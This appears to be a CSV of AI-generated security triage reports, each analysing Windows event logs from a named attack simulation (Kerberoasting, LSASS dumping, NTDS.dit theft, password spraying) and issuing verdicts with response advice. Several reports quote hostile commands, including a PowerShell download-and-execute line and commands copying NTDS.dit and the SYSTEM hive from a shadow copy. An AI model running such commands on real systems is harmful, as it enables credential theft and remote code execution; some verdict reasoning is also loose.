Directory Name,AI Response
Password Brute User using Kerbrute Tool,"Upon analysis of the provided Windows event logs, I have identified several points of concern that suggest potentially malicious activity:

**Suspicious Observations:**

1. **PowerShell Execution:**
   - The logs indicate the use of a PowerShell command with the execution of `script.exe` with a `bruteuser` parameter. This activity is initiated by an administrator-level user (`admin_test`) and is executed in the context of PowerShell.
   - The presence of parameters such as `--dc`, `-d`, and `bruteuser.txt` indicates that the script may be attempting some form of network scanning or enumeration, which is commonly associated with malicious reconnaissance or brute-force attacks.

2. **Security Log Events (Event ID 4798):**
   - These logs show user enumeration operations being performed, including users like `Administrator`, `admin_test`, `Guest`, and others.
   - The enumeration is conducted by a process hosted by `taskhostw.exe`. The timing aligns with the potentially suspicious PowerShell execution, raising suspicion regarding privilege elevation or unauthorized access attempts.

3. **Unusual Process Execution Patterns:**
   - Multiple `conhost.exe` and `wevtutil.exe` executions by the same user and several different logs signal a non-standard pattern of command host interaction, often used to facilitate stealthy operations.
   - Sysmon logs further confirm the execution of `script.exe` and other processes from unexpected directories like AppData, which is a common tactic for malware persistence and execution.

4. **Account and Privilege Information:**
   - High-level privileges seen in the security logs (Event ID 4672) further suggest that an account might be attempting escalated operations or accessing restricted resources inappropriately.

Given these observations, there appears to be a coordinated sequence of events aimed at unauthorized reconnaissance, potential brute force, and privilege escalation, possibly initiated by the user `admin_test`. The use of the command-line interfaces and the specific focus on user account enumeration and possible directory traversal imply a breach attempt.

Resolution: **MALICIOUS**

**Recommendations for Action:**
- Isolate the affected system to prevent further unauthorized access or data exfiltration.
- Conduct a comprehensive forensic analysis to capture and preserve evidence.
- Review network activity logs for any lateral movement or data transfer attempts stemming from this host.
- Audit and reset credentials for accounts referenced in the logs, especially high-privileged ones.
- Patch any vulnerabilities that may have been used to initiate the attack.
- Enhance monitoring and enable strict auditing for anomalous PowerShell usage and high-privilege activities."
WinPwn - PowerSharpPack - Kerberoasting Using Rubeus (2),"Upon reviewing the set of event logs you provided, several key points and observations have arisen:

1. **Edge Update Service**: The activity logs show standard operations related to Microsoft Edge Update, such as the start and stop of services and updates processes. This seems routine for a typical update process of a legitimate application like Microsoft Edge.

2. **Services and Host Executions**: 
   - There are multiple events related to standard Windows operations such as “svchost.exe,” a hosting process for Windows services, and “conhost.exe,” which hosts the console window infrastructure. These processes appear to have been executing in routine contexts and are primarily associated with system or network services like time synchronization.

3. **Security Logs**:
   - There are logs indicating changes to system time (Event ID 4616), which appear benign as they correspond to standard time synchronization actions with a trusted time server (`time.windows.com`).

4. **Sysmon Logs**:
   - Most events are associated with routine processes such as updates and system utilities.
   - However, there are multiple instances of ""whoami.exe"" being executed. While ""whoami.exe"" is not inherently malicious (it's a legitimate tool for querying user information), repeated execution within a short window might be worth investigating further for any unauthorized or suspicious user access attempts.

5. **PowerShell Logs**:
   - One notable entry involves the execution of a PowerShell command from a remote source, specifically downloading and executing a script from a third-party URL (`https://raw.githubusercontent.com/script/script/master/scriptBinaries/Invoke-script.ps1`). This type of behavior can be indicative of potentially malicious activity as it involves downloading and executing code from an external source using PowerShell, which is commonly abused for malicious purposes.

**Assessment**:
- The PowerShell activity is the most significant red flag due to its potential for malicious intent. While other activities appear routine and typical of a legitimate Windows environment, the PowerShell script execution externally can be associated with various attack techniques, possibly involving remote code execution or script-based attacks.

**Resolution**: **SUSPICIOUS**

**Guidance**:
- Further investigation into the nature of the invoked PowerShell script is crucial. Analyze the URL activity, examine network traffic, and check for known Indicators of Compromise (IoCs) associated with this script.
- Monitor endpoints for similar PowerShell activities and ensure endpoint protection solutions can detect and prevent such script-based threats.
- Verify if the ""whoami"" executions correlate with legitimate user activities or might be unauthorized user access attempts.
- Continuously audit and monitor for unusual tasks and ensure safe configurations regarding PowerShell and service executions to prevent misuse. 

These actions should provide deeper insights and confirm if any malicious activity was indeed performed."
Extract all accounts in use as SPN using setspn,"Based on the provided event logs, I have conducted a detailed analysis for any signs of anomalous or malicious activity on the Windows host. Here's a summary of the findings:

### Analysis:

1. **Frequent Use of PowerShell and Conhost**:
   - A PowerShell process (`C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe`) initiated by the user `SERVER002\\admin_test` is seen frequently, which could be a typical administrator or scripted activity but merits attention when looking for signs of nefarious activity.
   - Multiple instances of `conhost.exe` are associated with PowerShell, which by itself is not uncommon as conhost is used to provide console windows for command-line operations.

2. **Unusual Execution of System Tools**:
   - The logs contain instances of `wevtutil.exe`, which is typically used to manage Windows event logs. When seen without a corresponding legitimate rationale, this can sometimes indicate log tampering. However, it’s observed being run without further specific suspicious actions or argument details that conclusively indicate malicious intent.
   
3. **SetSPN Utility Execution**:
   - The `setspn.exe` utility used in conjunction with a command (`setspn -T %USERDNSDOMAIN% -Q */*`) initiated under the `cmd.exe` shell suggests a user or script querying service principal names. While this might be legitimate, in the context of lateral movement or reconnaissance within a domain, it might require further analysis. This needs to be explored further to determine if it's out of the norm for this environment.

4. **Time Events in Security Log**:
   - Time change events are logged, showing changes from `2024-10-27 22:59:15.6200899` to `2024-10-27 22:59:26.1581013` and back through `svchost.exe`. Frequent and unexplained time changes could indicate attempts at obfuscating event logs by altering system time. However, these time changes appear regular and might be part of a legitimate time synchronization activity.
   
5. **Edge Update Processes**:
   - Numerous entries related to Microsoft Edge Update processes are typical for any system maintaining up-to-date software. These entries correspond to scheduled or triggered updates from the Microsoft Edge software and do not indicate suspicious activity.

6. **Absence of Noted Malicious Indicators**:
   - The logs do not show known indicators of compromise such as the presence of known malicious hashes, atypical network connections initiated by system binaries, or exploit attempts.

### Assessment:

Based on the data from the event logs, while there are routine and potentially suspicious activities such as frequent usage of PowerShell and window host processes (conhost.exe) and a query of service principal names potentially indicative of reconnaissance, there is insufficient evidence to categorically label these activities as malicious without further context.

### Resolution:

- **SUSPICIOUS**: The logs contain activities like SPN querying and frequent PowerShell invocations which warrant further environmental context understanding and validation. These activities might be benign operational tasks, or they might indicate precursor activities within a potentially lateral movement scenario and therefore need additional investigation.

### Guidance:

1. **Investigate the Context**:
   - Cross-reference the timestamps and commands executed with authorized change management or administration activities. 
   - Review user `admin_test`'s typical tasks to see if the observed behavior falls within their usual scope of work.

2. **Monitor Future Activity**:
   - Set up alerts for repeated similar activity involving PowerShell, `wevtutil.exe`, and `setspn.exe` used in sequences that may suggest misuse or exploration of AD entities. 

3. **Conduct Endpoint Analysis**:
   - Consider deploying endpoint detection and response tools to look for behavioral anomalies or further persistence mechanisms that may not be apparent in base-level event logging.
   
4. **Engage Users/Owners**:
   - Contact involved users to verify task legitimacy or determine the need for further stakeholder engagement if unauthorized actions were performed.

By following up on these steps, you can further determine whether these events were benign processes or uncover deeper and more covert behaviors indicative of compromise."
WinPwn - Loot local Credentials - Decrypt Teamviewer Passwords,"Upon reviewing the provided Windows event logs, several observations stand out which suggest both suspicious and potentially malicious activities that warrant further investigation.

### Analysis of Logs

#### 1. **Process Execution Patterns**
- The execution of PowerShell with the following command line:
  ```plaintext
  ""powershell.exe"" & {$script_repo='https://raw.githubusercontent.com/script', iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/script/script/121dcee26a7aca368821563cbe92b2b5638c5773/script.ps1'), decryptteamviewer -consoleoutput -noninteractive}
  ```
  This indicates suspicious behavior as it involves downloading and executing a script directly from an online repository using `iex` (Invoke-Expression), a technique commonly used in malicious activities to download and run untrusted code.

- Instances of `whoami.exe`, `hostname.exe`, and `wevtutil.exe` executions appear normal individually but pose questions in conjunction with other observed behavior. However, there's no definitive sign of direct malicious activity from these alone.

#### 2. **Privilege Escalation Attempts**
- Security logs reveal the use of high-privilege accounts, such as `admin_test`, with granted privileges including `SeDebugPrivilege`, `SeBackupPrivilege`, `SeRestorePrivilege`, etc. While a high-integrity level is typically acceptable for administrative tasks, in combination with suspect processes like the aforementioned PowerShell command, it raises red flags.

#### 3. **Time Synchronization Events**
- The Security log shows Event ID 4616 which involves time changes. Time manipulation on systems can be an indicator of tampering, perhaps to obfuscate the timeline of activity.

#### 4. **Network Activity**
- Logon events (Security Event ID 4624) showed that the `admin_test` user account was accessed via NTLM authentication from a network source (`DESKTOP-3HL5B2P`). External logins warrant scrutiny to ensure they are legitimate.

### Conclusion and Recommendations

Based on the analysis:

- **Resolution: MALICIOUS**
  - The use of PowerShell to download and execute scripts from an external repository, combined with the operation of potentially benign processes at a high privilege level, suggests a compromise. The script execution might be an attempt to bypass security controls using PowerShell's scripting capabilities, which are often leveraged in cyberattacks.

### Guidance

1. **Immediate Actions**
   - Quarantine or isolate the affected host (Server002) from the network to prevent further spread or communication with external malicious infrastructure.
   - Capture a memory dump and a full disk image of the incident system for further forensics and possibly legal investigation.

2. **Forensic Analysis**
   - Perform a deeper forensic analysis to examine any files or persistent methods left by the script.
   - Investigate the source and contents of the script hosted on GitHub for malicious payloads or data exfiltration attempts.

3. **Security Posture Assessment**
   - Evaluate and enhance endpoint protection strategies, focusing on PowerShell execution policies and network access controls.
   - Consider implementing stronger authentication methods, such as multi-factor authentication, to protect against unauthorized access using compromised credentials.

4. **Monitoring and Response**
   - Continuously monitor for unusual activities, particularly focusing on the use of administrative accounts and PowerShell in command execution.
   - Train employees on security awareness, especially identifying and reporting suspicious account and network activities.

This case demands immediate and thorough investigation to mitigate any ongoing or future threats, remediate impact, and reinforce security controls."
WinPwn - Snaffler,"Upon analyzing the given Windows event logs, several key points stand out:

1. **PowerShell Execution with Suspicious Command Line (Sysmon Event ID 1)**
   - A suspicious PowerShell command was executed, indicated by the following command line argument within the event:
     ```
     ""powershell.exe"" & {$script_repo='https://raw.githubusercontent.com/script', iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/script/script/121dcee26a7aca368821563cbe92b2b5638c5773/script.ps1'), script -noninteractive -consoleoutput}
     ```
   - This command uses `Invoke-Expression` (iex) and `Net.WebClient` to download and execute a script from the internet, which is often a technique used to execute malicious scripts.

2. **Privilege Escalation and Sensitive Privileges (Security Event ID 4672)**
   - The user account `admin_test` has been granted several high-level privileges such as `SeDebugPrivilege`, `SeBackupPrivilege`, and others, which are often used in privilege escalation attacks.

3. **Time Change Events (System Events)**
   - There are indications of system time being changed, which can sometimes be used to manipulate time-stamps for forensic evasion strategies. A review of Event ID 4616 indicates that the time change was done by a system process, which could be associated with legitimate reasons but is worth verifying against organizational change logs.

4. **Multiple Uses of System Utilities (Sysmon Event ID 1 & 5)**
   - The use of `whoami`, `hostname`, and `wevtutil` suggests potentially normal system operations. However, these utilities are often used in initial access or after gaining a foothold to gather information about the user and system environment.
   - The `wevtutil` command has a history of being used for log clearing or querying where manipulation of Windows Event Logs might occur.

5. **HTTP Activity (Sysmon Event ID 1)**
   - There is activity related to Microsoft Edge Updates. While this could potentially be benign, verifying the associated file paths and ensuring legitimacy is a prudent step due to the level of permissions involved and HTTP activity pattern similarity with malicious activities.

Considering the above points, there are multiple signs pointing towards potentially malicious behaviors primarily due to suspicious PowerShell activities and privilege escalation. The downloading and execution of scripts from the internet using PowerShell is a strong indicator of an attempted or successful compromise.

**Resolution: MALICIOUS**
- The context of downloading a script and executing it without user interaction is highly indicative of a compromise attempt or action.
- Immediate action should be taken to isolate the system, conduct a thorough incident response, and apply remediation steps.
- It is recommended to review the origins of the user `admin_test`, check for any unauthorized access or persistence mechanisms, and perform a full malware scan.

The situation needs urgent corrective measures to prevent potential data breaches or further escalation on the compromised system."
Retrieve Microsoft IIS Service Account Credentials Using AppCmd (using config),"Below is the detailed analysis of the provided Windows event logs based on the entries from PowerShell and Sysmon logs:

### PowerShell Log Analysis:
- The PowerShell logs indicate the execution of a single command:
  - **Command Executed:** `powershell.exe & {C:\\Windows\\System32\\inetsrv\\appcmd.exe list apppool /config}`.
  - **Context:** This command is used to list AppPools under IIS (Internet Information Services). The usage of AppCmd.exe in this context seems related to administrative tasks that deal with IIS configurations and management.
  
- **Observation:** 
  - Running scripts and commands involving `appcmd.exe list apppool /config` directly could be considered normal when done by a user managing the web server. However, if unexpected or performed by unauthorized users, it might indicate an attempt to gather information about the server setup for further exploitation.

### Sysmon Log Analysis:
- Multiple executions are logged involving common utilities and processes, such as:
  - **Microsoft Edge Installer Execution:** This appears as an update installation, executed by `NT AUTHORITY\SYSTEM`. There is no indication of suspicious activity, as it's common for software updates to run under SYSTEM privileges.
  - **PowerShell Execution:** 
    - **Process:** `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`.
    - **User:** `SERVER002\admin_test`. The presence of PowerShell usage by the admin_test account could be legitimate, depending on the context and frequency of use.
  - **Utility Executions:**
    - **Wevutil.exe:** This is a legitimate Windows utility for event log management. Executed by `admin_test`, it seems to be involved in routine administrative tasks.
    - **Hostname and whoami Executions:** These processes are usually harmless and typically used for gathering host and user information, likely as part of system administration tasks.
  
- **Repeated Patterns:**
  - There are consistent dealings with `conhost.exe`, which is a legitimate Windows process dealing with console applications.
  
### Assessment:
- **Overall Findings:** 
  - The logs show routine activity by the `admin_test` user, involving legitimate Windows processes.
  - The PowerShell activity aligns with possible administrative tasks related to IIS server management; this could be either routine or preliminary reconnaissance if done unexpectedly.
  - The activities do not exhibit typical malicious behavior such as privilege escalation attempts, persistence methods, data exfiltration activities, or unauthorized access.

### Resolution:
Given the context of the activities, even though the running of AppCmd without prior context could raise flags, there's insufficient direct evidence pointing to malicious activities or overt indicators of compromise within these logs. Still, it holds potential for further probing if out of context. Thus, a cautious approach would yield a **SUSPICIOUS** classification. 

**Recommendation:** 
- Verify if the `admin_test` account had authorized reasons for its activities around the log timeframes.
- Confirm if there were any significant settings or configuration changes in IIS that should be reviewed.
- Conduct user reviews to ensure that actions are consistent with regular administrative duties."
Simulating access to Chrome Login Data,"Upon reviewing the provided event logs, here is a detailed analysis with a focus on identifying potential malicious activity:

### Suspicious or Anomalous Activities:
1. **PowerShell Commands**:
   - The Windows PowerShell events (EventID 600) indicate commands executed using PowerShell that involve copying files from the Google Chrome User Data directory, specifically ""Login Data"" and ""Login Data For Account"", to another directory (C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\\Externalfiles). 
   - This activity is highly suspicious as it indicates an attempt to exfiltrate credentials or sensitive data stored in Chrome's login database.

2. **Process Execution**:
   - The Sysmon logs show the execution of `powershell.exe` from the command line with the same arguments for the file copying (EventID 1). The consistency across logs strengthens the case for concerning activity.
   - The frequent use of `wevtutil.exe`, `conhost.exe`, and `event execution on `HostName`, `whoami`, suggest the possibility of log tampering or reconnaissance activity often associated with malicious behavior.

3. **Logon Events**:
   - Security log events indicate normal SYSTEM and NT AUTHORITY operations with elevated privileges, typical for standard system operations; however, pairing this with the PowerShell activity is indicative of potential privilege misuse if unauthorized.

### Malicious Indications:
- **Indicators of Compromise (IoC)**:
  - The exfiltration of ""Login Data"" from Chrome suggests a breach attempt to gather user credentials.
  - The use of PowerShell for such operations is a common tactic seen in malware and penetration scenarios attempting to steal sensitive user data.

### Assessment and Resolution:
- Given the specific PowerShell command to copy sensitive data and the overall context of the events occurring almost simultaneously, there is a strong indication of malicious activity.

- **Resolution**: **MALICIOUS**
  - The activities confirm that there is a deliberate attempt to access and possibly exfiltrate user credentials from the compromised system using PowerShell scripts. This strongly suggests the presence of malicious intent and potential compromise.

### Recommendations:
1. **Immediate Response Actions**:
   - Isolate the affected system (Server002) from the network to prevent further data exfiltration and unauthorized access.
   - Perform a comprehensive forensic analysis to understand the extent of the compromise.
   - Examine Chrome user data access permissions and audit logs for unauthorized access.

2. **Remediation**:
   - Change passwords and secure accounts associated with the compromised system.
   - Deploy endpoint detection and response tools to identify and contain suspicious activities.
   - Apply security patches and updates to mitigate any known vulnerabilities exploited during the breach.

3. **Monitoring and Policy Enforcement**:
   - Implement PowerShell logging and monitor for unusual commands.
   - Enforce least privilege principles and implement strict access controls for accessing user data files.
   - Conduct regular security training and awareness for users regarding phishing and credential harvesting threats.

By addressing these observations and implementing the recommended actions, the affected organization can improve its security posture and mitigate the risks associated with this compromise."
Create Volume Shadow Copy with vssadmin,"Based on the provided event logs from the Windows host, here is an analysis of potential suspicious or malicious activities observed:

### Analysis:

1. **Security Event Logs (`EventID 5379`)**:
   - Several occurrences of `EventID 5379` which correlates with credential validation events for a Microsoft Account on `Server002`. The `ReturnCode` `3221226021` suggests an error might have occurred, often indicating some form of access issue or invalid request. However, there's no concrete evidence in this log alone that it is malicious. The same log is repeated several times without variation. If these events are not aligned with expected behavior, further context or investigation would be recommended.

2. **Windows PowerShell and Application Logs**:
   - No suspicious activity was noted or provided here.

3. **System Event Logs**:
   - Regular security intelligence updates for Microsoft Defender Antivirus are logged. This is benign activity typical of routine updates.

4. **Sysmon Logs**:
   - There are several entries where command executions (CMD, REG, FINDSTR) are executed by the user `SERVER002\admin_test`. The commands `reg query` and the check related to `ProductOptions` suggest a detection of server type. This could be suspicious if not expected behavior from this user or system. However, the operations themselves are not inherently malicious without further context.
   - Execution of `vssadmin.exe create shadow /for=C:` to create a shadow copy of a volume is potentially risky. This utility is often used by ransomware to delete shadow copies, preventing data recovery. Yet, in isolation, without more context, this alone doesn't confirm malicious intent.
   
5. **Other Processes**:
   - Processes related to updates (`wuauclt.exe`, `MpSigStub.exe`) and security operations (`AM_Delta.exe`) running as `NT AUTHORITY\SYSTEM` are typical of system operations and are not inherently malicious.
   - Use of utilities like `whoami.exe` and `hostname.exe` were seen which might indicate normal behavior depending on the system usage context.

### Conclusion:

Given the observations:

- The **use of vssadmin and reg utilities** from a user context (`admin_test`) might be anomalies if performed without administrative oversight or security purpose. **`vssadmin` usage specifically can suggest nefarious intent if out of the ordinary.**
- Other activities like security updates and system queries, in conjunction with the lack of corresponding alarming behavior, might be typical operations otherwise.

### Assessment:

- **Resolution**: **SUSPICIOUS**
  
While the logs do not conclusively show malicious activity, they contain behavior such as shadow copy manipulation that warrants further investigation. We recommend reviewing system practices, confirming activities with responsible administrators, and enhancing monitoring for any further similar activities. Specific attention should be taken if these actions align with known attack vectors like ransomware.

### Guidance for Further Actions:
- Validate if the `admin_test` account's operations were expected and authorized.
- Look into whether the `vssadmin create shadow` command was sanctioned as part of a legitimate administrative process.
- Ensure that any potentially suspicious activities are correlated with other logs and endpoint data to confirm or dispel doubts about compromise.
- Continue to monitor all high-integrity processes and actions for anomalies and set alerts for `vssadmin`, `reg`, or similar actions per organization's security policies."
Copy NTDS.dit from Volume Shadow Copy,"Upon reviewing the provided Windows event logs, here's a detailed analysis:

1. **Suspicious Process Execution:**
   - There are multiple instances where `cmd.exe` is executed with unusual command-line arguments. Specifically:
     - A `cmd.exe` process executed a command attempting to create a Volume Shadow Copy (`Invoke-fileTest data.003 -TestName 'Create Volume Shadow Copy with vssadmin'`). This could indicate an attempt to gather file system snapshots.
     - Another `cmd.exe` process executed with commands that suggest potential data extraction: 
       - `""cmd.exe\"" /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\Windows\Temp\ntds.dit & copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Windows\Temp\VSC_SYSTEM_HIVE & reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM_HIVE""`
       - This activity suggests an attempt to access sensitive data such as the Active Directory database and SYSTEM registry hive, which are critical indicators of a potential security compromise or unauthorized data access.

2. **Privilege Usage:**
   - Event ID 4672 indicates special privileges were assigned to the `SYSTEM` account (`SeDebugPrivilege`, `SeBackupPrivilege`, and others). While SYSTEM typically operates with high privileges, this event in the context of sequence and timing should be analyzed since these privileges, in combination with the observed command activity, could lead to privilege escalation or unauthorized access.

3. **Credentials Access Attempts:**
   - Numerous Event ID 5379 instances suggest failed credential read attempts related to a Microsoft account and Windows Live services. This pattern might indicate attempts to extract or access credential-related data without success.

4. **Tool Usage:**
   - There are Sysmon logs showing multiple usages of `wevtutil.exe` to possibly export or interact with event logs, which can be part of anti-forensics activities.

5. **Timeline and Correlations:**
   - The timing of events showing `cmd.exe` with potential data exfiltration commands correlates with privilege elevation and access attempts, contributing to the appearance of a coordinated attack.

**Assessment and Conclusion:**
- The specific execution of commands to access sensitive files such as the NTDS.dit and SYSTEM hive via Volume Shadow Copies, combined with privilege escalation and potential credential access attempts, strongly suggests malicious intent.

**Guidance on How to Proceed:**
- Immediate actions should include an isolation of the host from the network to prevent further data exfiltration or lateral movement across the network.
- Conduct a detailed forensic investigation focusing on the origin and purpose of the executed commands.
- Perform a review of access logs to identify potentially compromised accounts and consider resetting credentials.
- Investigate how the volume shadow copy operations were initiated to prevent future occurrences.
- Enhance monitoring and detection to catch similar patterns early in the future.

**Resolution:**
- **MALICIOUS** - The logs contain definitive activity that is malicious, showcasing potential compromise and should be treated as an active threat."
Dump LSASS.exe Memory using direct system calls and API unhooking,"Upon analyzing the provided Windows event logs, I have identified some suspicious activities that could potentially indicate malicious behavior:

1. **Security Log EventID 4624 and 4672:**
   - **Logon Event (4624):** The log shows a Service type logon (LogonType 5) by the SYSTEM account, which is normal for system processes.
   - **Special Privileges Assigned (4672):** This event indicates privileged rights were granted to the SYSTEM account, including `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and `SeLoadDriverPrivilege`. These can be used for privilege escalation or system manipulation if exploited.

2. **Sysmon Logs:**
   - **Powershell Execution:** The execution of `powershell.exe` by a user (`SERVER002\\admin_test`) is listed but lacks specific command-line arguments that could directly flag it as abnormal. Powershell, however, is a common tool used by attackers for script-based attacks.
   
   - **Cmd Execution:** An unusual command execution by `cmd.exe` is logged, specifically running `cmd.exe /c ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\Outflank-scriptt.exe""`. This script, located in the temporary directory, and potentially obfuscated directory path indicate suspicious behavior suggesting the execution of potentially malicious software or script.

   - **Event Log Clearing via `wevtutil.exe`:** The execution of `wevtutil.exe` multiple times, especially with the particular command to export logs (`epl`), is a red flag as it suggests an attempt to manipulate or clear event logs, which is a common tactic to cover tracks after exploiting a system.

3. **Process Execution and Parent Relationships:**
   - A series of sessions involving `cmd.exe`, `wevtutil.exe`, and other console hosts like `conhost.exe` executed with `admin_test` privileges seem to map back to `wsmprovhost.exe`, suggesting possible use of legitimate system tools for potentially unauthorized tasks.

**Conclusion and Assessment:**
- The execution patterns of PowerShell scripts, command prompts invoking potentially sketchy executables, and actions concerning event logs are indicative of suspicious activity indicative of a security threat or compromise.

**Resolution: SUSPICIOUS**
- The activity observed in the logs is suspicious and warrants further investigation. The specific actions involving PowerShell script execution and log manipulation need closer scrutiny to confirm whether they are part of a legitimate administrative task or a deliberate attempt at covert malicious activity.

**Guidance on How to Proceed:**
1. **Conduct a Detailed Forensic Investigation:** Review the file `Outflank-scriptt.exe` to understand its origin, functionality, and legitimacy.
2. **User Account Activities:** Investigate the activities of the `SERVER002\\admin_test` account. Examine last logon time, changes in user permissions, and any unauthorized elevation attempts.
3. **Monitor for Anomalous Behavior:** Enable more detailed logging and monitoring for further suspicious PowerShell scripts, command execution, and potential persistence mechanisms.
4. **Endpoint Protection Measures:** Ensure endpoint protection systems are updated and actively scanning systems associated with `Server002`.
5. **Review Network Traffic:** Check for unusual outbound traffic from the involved server which could indicate data exfiltration or command and control communication."
Gsecdump,"Based on the analysis of the provided Sysmon log entries, several indicators point toward potentially suspicious behavior:

### Analysis:

1. **Frequent Use of PowerShell and Command-line Utilities:**
   - The logs show multiple instances of `powershell.exe` being invoked. This can be a legitimate activity, however, Powershell is frequently used by attackers for scripting and command execution.
   - Commands such as `wevtutil.exe` and `cmd.exe` are used often. While their use might be benign in some contexts, they can also be employed for malicious purposes, such as clearing logs (`wevtutil` could be a tool for this), or executing malicious scripts via `cmd.exe`.

2. **Execution of Non-standard Processes:**
   - **Hostname, Whoami, and Wevtutil Execution:** The execution of `hostname.exe` and `whoami.exe` seems benign, as these are common Windows utilities for gathering basic system information. However, their frequent invocation without clear administrative tasks can suggest reconnaissance or persistence establishment activities.
   - **Command Execution through CMD.exe:** The specific command-line execution of a suspicious path in a temp directory using `cmd.exe` suggests a script being executed, which could potentially be unauthorized. The command line indicates execution from a temporary directory, which is often a red flag for transient or unauthorized scripts being run (`C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\script.exe`).

3. **Security Log Entries:**
   - The repeated EventID 5379 in the security logs indicates credential-related activity involving the MicrosoftAccount. The return codes imply unsuccessful operations. While they don't directly indicate malicious activity, they could represent attempts to access or manipulate Microsoft account credentials.

### Threat Assessment:

- **Suspicious Indicators:**
  - Multiple uses of `wevtutil.exe` and `cmd.exe` for potential script execution.
  - Usage of a PowerShell session.
  - Execution of utilities (whoami, hostname) commonly used in reconnaissance.
  - Scripts running from temporary directories.

### Resolution:

Given the observations of unusual or potentially unauthorized command-line executions, frequent PowerShell sessions, and scripts running from temporary directories, the resolution is:

- **SUSPICIOUS** 

### Guidance:

1. **Further Investigation Required:**
   - Validate the chain of command execution associated with these utilities.
   - Assess the context and necessity for each PowerShell and `cmd.exe` invocation.
   - Investigate the script executed from the temporary directory for malicious content.
   - Review user activity logs for `SERVER002\\admin_test` to affirm if the actions were legitimate or unauthorized.
   - Examine network traffic for signs of external communications initiated by these processes that may indicate data exfiltration or external control.

2. **Preventive Measures:**
   - Implement stricter monitoring and alerting on PowerShell and command-line utility usage.
   - Consider restricting or more closely accounting for user actions involving execution of scripts from temporary directories.

These steps will help ensure any potentially malicious activity is identified, contained, and necessary precautions are taken."
Brute Force Credentials of single Active Directory domain users via SMB,"Based on the provided logs for analysis, here are the key observations:

### Security Logs Analysis:
1. **Event ID 4624 (Logon Success)**: Multiple logon events for user ""admin_test"" using NTLM and Logon Type 3 (Network), coming from IP `192.168.0.102`. These seem to be legitimate network logins.
   
2. **Event ID 4672 (Special Privileges Assigned)**: The user ""admin_test"" is consistently granted special privileges like `SeSecurityPrivilege`, `SeBackupPrivilege`, etc. This is typical for administrative accounts, but noteworthy to ensure the user is authorized and expected to have these rights.

### System and Application Logs:
- **Time Synchronization**: Events related to the Windows Time Service and slight adjustments in system time suggest normal time synchronization activities.
- **Edge Update Logs**: Several entries indicate the Microsoft Edge Update service running and stopping processes. No unusual behavior detected here; these are standard update operations.

### Sysmon Logs Analysis:
1. **Process Creation**:
   - Multiple `svchost.exe` and `wevtutil.exe` executions are noted, which are benign if running from their default paths and by legitimate processes.
   - There's an execution of `cmd.exe` with command-line arguments to write passwords to `passwords.txt`, and attempts to use these passwords against network shares. This is a strong indicator of credential harvesting and a brute-force attack attempt.

2. **Adversarial Tactics**:
   - The use of `cmd.exe` for potentially malicious activities (e.g., password dumps and the use of `net.exe` to attempt unauthorized access to shares) is suspicious.
   - This might suggest an attempt by an attacker or a script trying to exploit weak or default passwords by brute-force.

### Assessment:
- **Credential Harvesting Attempt**: The behavior of `cmd.exe` indicates a script or user attempted to access administrative IPC shares using various passwords. This is a classic sign of a brute-force attack or a credential spray attempt.

### Resolution:
- **MALICIOUS**: The detected execution of command-line scripts aimed at testing various passwords against a network share, and logging potential results indicates outright malicious activity. This aligns with tactics used in unauthorized credential access attempts.

### Guidance:
1. **Immediate Action**: 
   - Isolate the machine `Server002` to prevent potential spread or exfiltration of data.
   - Investigate the source IP `192.168.0.102` to ascertain if it's controlled by an attacker.
   
2. **Further Investigation**:
   - Examine any artifacts remaining from the `cmd.exe` execution, especially `passwords.txt`.
   - Verify the activity logs of the user `admin_test` to ensure there's no OAuth or API abuse.
   - Conduct a thorough review of user accounts and reset credentials as needed.
   
3. **Recommendations**:
   - Enhance monitoring with alerts for unusual command executions like the detected password testing.
   - Implement multi-factor authentication, if not already in place, to mitigate future credential attacks.
   - Consider network segmentation to limit potential lateral movement within the network."
WinPwn - DomainPasswordSpray Attacks,"Upon reviewing the provided event logs, I have identified some key indicators that suggest potential malicious activity:

1. **PowerShell Activity**: 
   - The logs indicate the execution of a PowerShell script that appears to be downloading a script from a potentially suspicious external source (`https://raw.githubusercontent.com/script/script/121dcee26a7aca368821563cbe92b2b5638c5773/script.ps1`). This behavior can be indicative of an attempt to execute a script from an external repository, which is a common technique used in various types of attacks, including malware distribution and remote code execution.

2. **Command-Line Arguments**:
   - The command being executed via PowerShell includes the use of `domainpassspray -consoleoutput -noninteractive -emptypasswords`, suggesting a potential attempt of a password spraying attack. Password spraying is a method used by attackers to access a large number of accounts by using a few commonly used passwords.

3. **Process Execution**:
   - Regular and frequent execution of Windows utilities (`wevtutil.exe`, `conhost.exe`, `hostname.exe`, and `whoami.exe`) under the user `SERVER002\\admin_test` stands out, especially if these executions are closely tied with periods of suspicious activity detected on the network or other behavior suggestive of attempted reconnaissance or privilege escalation.

4. **Use of High-Integrity Processes**:
   - The PowerShell process and some other utilities are running with a high integrity level, which means they have administrative privileges. Coupled with the external script execution, this could allow an attacker to perform high-level actions on the system.

5. **Security Center Status**:
   - Windows Defender is reported as being turned on (`SECURITY_PRODUCT_STATE_ON`), which is a good sign. However, the detection capabilities might not have flagged the suspicious activity, or the logs might not reflect the detection events.

**Assessment**:
The logs show indicators commonly associated with malicious activity, particularly the PowerShell command that downloads and executes an external script and attempts a password spray attack. The presence of these indicators, especially the unauthorized external connections and potential password attacks, strongly suggests a compromise.

**Resolution**: MALICIOUS - The activity captured in the logs is indicative of malicious intent, showing clear signs of attempted unauthorized access and potentially harmful actions.

**Guidance for Next Steps**:
- **Immediate Containment**: Disconnect the affected machine from the network to prevent further unauthorized access or data exfiltration.
- **Detailed Analysis**: Further analyze the scripts and any files downloaded onto the system.
- **Credential Audit**: Review for any unauthorized changes to user accounts or privilege levels.
- **Enhance Monitoring**: Increase monitoring on all systems for similar activity, especially focusing on PowerShell script executions and network traffic anomalies.
- **Security Patches and Updates**: Ensure all systems are up-to-date with the latest security patches and consider updating any outdated defense mechanisms.
- **User Training**: Educate users about the dangers of executing unverified scripts and provide training on secure use of administrative privileges."
